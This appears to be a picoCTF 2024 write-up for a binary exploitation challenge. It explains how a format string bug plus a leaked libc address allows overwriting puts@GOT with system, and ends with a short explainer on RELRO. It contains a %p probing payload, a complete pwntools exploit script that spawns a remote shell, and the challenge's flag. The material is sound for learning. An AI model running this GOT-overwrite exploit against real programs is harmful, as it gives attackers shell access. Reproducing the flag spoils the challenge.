# format string 2 #
 
## Overview ##

Category: [Binary Exploitation](../../..)

Topics: Format string, Binary Exploitation, GOT overwrite, picoCTF-2024

## Description ##

This program doesn't contain a win function. How can you win?

## Approach ##

For this challenge, I am provided a c file, "format-string-3.c", a binary file, "format-string-3", libc, "libc.so.6", and an interpreter, "ld-linux-x86-64.so.2". Inspecting the c file, I noticed that the `hello` function leaks the information of the runtime address of `setvbuf`:

    printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);

 The `setup` function seems like it turns off buffering for stdin, stdout, and stderr. While the `main` function calls the two previously mentioned functions and also print the buffer without any format strings. With this information, I know that this is a format string attack again (Like always):
    
    printf(buf);
	puts(normal_string);

From all the information I given, it seems like given the leaked address of `setvbuf`, we are able to find libc base, use it to find `system` function, and override `puts` function with `system` function (Since normal_string = "/bin/sh", puts("/bin/sh") -> system("/bin/sh")). This will spawn a shell with the same privileges as the running process, allowing us to read flag.txt. But to make sure that I could override the address of `puts`, I need to check if RELRO is "Partial RELRO":

    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

Luckily, it is Partial RELRO (Also PIE is disable, nice), which means I can override the address of `puts`. I then preceed to open up the binary file in gdb and enter a bunch of %p:

    Okay I'll be nice. Here's the address of setvbuf in libc: 0x7ffff7e5a3f0
    aaaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
    aaaaaa0x7ffff7fb8963.0xfbad208b.0x7fffffffd890.0x1.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x7025616161616161.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0xa.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).
    /bin/sh
    [Inferior 1 (process 1004) exited normally]

Analysing it, the value `0x7025616161616161` corresponds to `aaaaa%p` in little-endian, confirming that user input begins at argument index 38. This will be helpful when I use `fmtstr_payload` function provided by pwntools. Now another thing I need to figure out is the libc base address (address in libc going keep changing thanks to ASLR), with the leaked setvbuf, I could figure it out. Leaked address = libc base + libc function offset (offset of setvbuf in thise case), this small equation will become libc base = randomize address - setvbuf offset. Since I have the libc file, I could use command like `readelf -s libc.so.6 | grep "setvbuf"` to find setvbuf offset. Another way to find setvbuf offset is have pwntool do it for you (This will be shown later in the payload script). With all the information gathered, I believe its time to start writing code for the payload:

    from pwn import *

    # PORT will vary
    HOST = 'rhea.picoctf.net'
    PORT = 51641

    # Let pwntools know that this architecture is amd64 or else it assume it is a 32 bit x86. 
    context.arch = 'amd64' 

    # Connection to remote or local 
    p = remote(HOST, PORT)
    #p = process('./format-string-3')

    libc = ELF('./libc.so.6')
    e = ELF('./format-string-3')

    # Get the libc address
    p.recvuntil(b'libc: ')
    libc_address = p.recvline()

    print(f"Leaked Address: {libc_address}")

    # Cacluate libc base and tells pwntool that this is the base address in memory
    libc.address = int(libc_address, 16) - libc.sym.setvbuf

    print(f"Libc Base: {hex(libc.address)}")

    # Overwrite puts@GOT with the address of system in libc
    # e.got.puts is the address of GOT entry for puts, since PIE is disabled, no need to worry about it changing every runtime
    # pwntools auto adjust "libc.sym.system" since we provided it with the base address
    payload = fmtstr_payload(38, {e.got.puts:libc.sym.system}, write_size='short')

    p.sendline(payload)

    p.interactive()

Success! The results are:
    $ ls
    Makefile
    artifacts.tar.gz
    flag.txt
    format-string-3
    format-string-3.c
    ld-linux-x86-64.so.2
    libc.so.6
    metadata.json
    profile
    $ cat flag.txt
    picoCTF{G07_G07?_f574d38f}

Flag: picoCTF{G07_G07?_f574d38f}

## Reflection ##
This challenge was interesting it uses the idea of a format string attack to perform a GOT overwrite. One of the more tricky parts was recognizing that leaking a libc function address allowed me to calculate the libc base address at runtime, which was necessary to correctly resolve the address of system. With the libc base known, I was able to overwrite puts@GOT with system, causing the program to execute system("/bin/sh") when puts was called. Overall, this challenge was a great exercise in understanding how format string vulnerabilities interact with dynamic linking, a bit of ASLR, and libc during binary exploitation.

## What is RELRO? ##
So what exactly is RELRO? RELRO stands for Relocation Read-Only. It is suppose to be a linker hardening feature that protects the global offset table (GOT) from being overwritten during runtime. There are two types of RELRO: Partial RELRO and Full RELRO. Partial RELRO makes GOT appear before BSS (Stores declared, but not initialized global and static variables) in memory, since BSS comes after GOT, a buffer overflow attack on a global variable overwriting global entries will not be possible. But since ".got.plt" (where external function addresses live, and why GOT overwrites work.) is still writeable, attacker could overwrite addresses like `puts` to be `system`. Full RELRO fixes this problem by making the entire GOT (.got and .got.plt) read-only, this removes the ability to perform GOT overwrite attack. Although having FULL RELRO can prevent GOT overwrite attack, it can increase program startup time as all symbols needs to be resolved before the program starts. 


## Reference ##
https://ctf101.org/binary-exploitation/relocation-read-only/
https://ctf101.org/binary-exploitation/what-is-the-got/